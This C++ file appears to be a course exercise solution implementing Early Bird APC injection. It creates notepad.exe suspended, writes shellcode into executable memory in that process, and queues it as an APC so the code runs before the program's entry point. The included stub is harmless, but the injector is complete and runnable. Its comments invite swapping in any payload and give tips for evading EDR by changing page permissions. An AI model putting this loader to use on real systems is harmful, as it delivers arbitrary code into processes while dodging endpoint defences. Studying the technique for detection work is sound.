/*
  Module 16 — Injection Variants
  Exercise 02 Solution — Early Bird APC Injection
  =================================================
  More reliable than standard APC injection because the APC is queued
  BEFORE the target process's main() has run — the main thread is still
  suspended from CREATE_SUSPENDED when we call QueueUserAPC.

  When ResumeThread is called, the thread immediately processes its APC
  queue (via NtTestAlert, called internally by the loader before entering
  the image's entry point). The shellcode therefore runs BEFORE any of
  the target process's own code.

  Why this matters (detection angle):
    - CREATE_SUSPENDED → VirtualAllocEx → WriteProcessMemory → QueueUserAPC
      → ResumeThread is a tight, recognisable sequence.
    - EDRs look for this exact pattern. Behavioural detections watch the
      time between CREATE_SUSPENDED and ResumeThread and flag any remote
      allocation in that window.

  Compile:
    g++ -std=c++17 -Wall -o sol02.exe sol02_early_bird.cpp -lkernel32
*/

#include <windows.h>
#include <iostream>

// Minimal x64 shellcode stub — adjusts stack, does nothing, returns.
// Replace with any position-independent payload; notepad will still
// launch because the stub returns cleanly to the loader.
static const BYTE STUB[] = {
    0x48, 0x83, 0xEC, 0x28,  // sub rsp, 0x28   (Windows x64 calling convention shadow space)
    0x90, 0x90, 0x90, 0x90,  // NOP sled — your payload bytes go here
    0x48, 0x83, 0xC4, 0x28,  // add rsp, 0x28
    0xC3                      // ret
};

// ---------------------------------------------------------------------------
// earlyBirdInject
// ---------------------------------------------------------------------------
// Creates targetPath in a SUSPENDED state, injects shellcode via APC into
// the (still-suspended) main thread, then resumes. The APC fires before
// the process entry point.
//
// Returns true on success. On failure, terminates the partially-created
// process so it doesn't linger as a zombie.
bool earlyBirdInject(const char* targetPath, const BYTE* shellcode, size_t shellcodeLen) {
    STARTUPINFOA si       = {};
    PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si);

    // -----------------------------------------------------------------------
    // Step 1: Create the target process in SUSPENDED state.
    //
    // CREATE_SUSPENDED stops the main thread before any user-mode code runs.
    // The thread handle in pi.hThread is our injection point.
    // -----------------------------------------------------------------------
    if (!CreateProcessA(
            targetPath,         // lpApplicationName
            nullptr,            // lpCommandLine
            nullptr,            // lpProcessAttributes
            nullptr,            // lpThreadAttributes
            FALSE,              // bInheritHandles
            CREATE_SUSPENDED,   // dwCreationFlags — key flag
            nullptr,            // lpEnvironment
            nullptr,            // lpCurrentDirectory
            &si,
            &pi))
    {
        printf("[-] CreateProcessA failed: %lu\n", GetLastError());
        return false;
    }
    printf("[+] Created suspended process: PID=%lu TID=%lu\n",
           pi.dwProcessId, pi.dwThreadId);

    // -----------------------------------------------------------------------
    // Step 2: Allocate RWX memory in the new process.
    //
    // We use PAGE_EXECUTE_READWRITE so we can write shellcode and then
    // execute it. A hardened variant would use RW first, then flip to RX.
    // -----------------------------------------------------------------------
    LPVOID remoteMem = VirtualAllocEx(
        pi.hProcess, nullptr, shellcodeLen,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    printf("[+] Remote allocation at %p (%zu bytes)\n", remoteMem, shellcodeLen);

    // -----------------------------------------------------------------------
    // Step 3: Copy shellcode into the remote allocation.
    // -----------------------------------------------------------------------
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcodeLen, &written)
        || written != shellcodeLen)
    {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    printf("[+] Wrote %zu bytes of shellcode\n", written);

    // -----------------------------------------------------------------------
    // Step 4 (optional): Harden permissions to PAGE_EXECUTE_READ.
    //
    // Removes the write bit after the shellcode is in place. Reduces the
    // footprint — fewer EDR detections flag RX pages than RWX pages.
    // -----------------------------------------------------------------------
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(pi.hProcess, remoteMem, shellcodeLen,
                          PAGE_EXECUTE_READ, &oldProtect)) {
        // Non-fatal — continue with RWX if this fails.
        printf("[!] VirtualProtectEx to RX failed (non-fatal): %lu\n", GetLastError());
    }

    // -----------------------------------------------------------------------
    // Step 5: Queue the APC to the suspended main thread.
    //
    // pi.hThread is the main thread handle returned by CreateProcess.
    // Because the thread is suspended, the APC will sit in the queue until
    // ResumeThread allows the thread to run. The loader then calls
    // NtTestAlert() before reaching the image entry point, which flushes
    // the APC queue — our shellcode fires first.
    // -----------------------------------------------------------------------
    if (!QueueUserAPC((PAPCFUNC)(ULONG_PTR)remoteMem, pi.hThread, 0)) {
        printf("[-] QueueUserAPC failed: %lu\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    printf("[+] APC queued to main thread — shellcode will run before entry point\n");

    // -----------------------------------------------------------------------
    // Step 6: Resume the main thread.
    //
    // The thread will:
    //   1. Resume from its suspended state.
    //   2. The loader calls NtTestAlert(), which flushes the APC queue.
    //   3. Our shellcode executes in the thread context.
    //   4. (If shellcode returns cleanly) execution continues to the real
    //      entry point — notepad.exe appears normally.
    // -----------------------------------------------------------------------
    DWORD prevSuspendCount = ResumeThread(pi.hThread);
    if (prevSuspendCount == (DWORD)-1) {
        printf("[-] ResumeThread failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return false;
    }
    printf("[+] Thread resumed (previous suspend count: %lu)\n", prevSuspendCount);

    // -----------------------------------------------------------------------
    // Cleanup — close our copies of the handles; the process keeps running.
    // -----------------------------------------------------------------------
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

// ---------------------------------------------------------------------------
// main
// ---------------------------------------------------------------------------
int main() {
    const char* target = "C:\\Windows\\System32\\notepad.exe";

    printf("[*] Early Bird APC Injection — Module 16 Exercise 02 Solution\n");
    printf("[*] Target: %s\n", target);

    if (earlyBirdInject(target, STUB, sizeof(STUB))) {
        printf("[+] Success — notepad should open after shellcode stub returns.\n");
        printf("[*] EXPERIMENT: Replace STUB with a 2-second Sleep payload —\n");
        printf("[*]   notepad's window will be delayed by 2 seconds (shellcode\n");
        printf("[*]   runs before the WinMain message loop).\n");
    } else {
        printf("[-] Failed. Error: %lu\n", GetLastError());
        return 1;
    }

    return 0;
}
